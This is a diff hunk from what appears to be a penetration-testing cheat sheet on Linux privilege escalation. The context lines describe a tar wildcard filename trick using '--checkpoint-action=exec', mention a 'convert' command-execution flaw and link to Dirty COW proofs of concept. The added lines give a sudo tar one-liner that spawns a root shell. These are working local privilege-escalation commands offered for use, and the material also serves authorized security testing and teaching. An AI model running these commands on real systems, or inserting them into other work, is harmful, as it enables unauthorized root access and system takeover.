@@ -444,6 +444,8 @@ Using vulnerability in 'convert' to execute arbitrary commands with privelege:
 #### filename for tar execution vuln
 If you want to exucute code with a tar command (e.g. backup cronjob) , rename file to backup as follows:
 `'--checkpoint-action=exec=sh file.sh'`
+OR
+`> sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh`
 
 #### dirty cOw privilege escalation
 https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
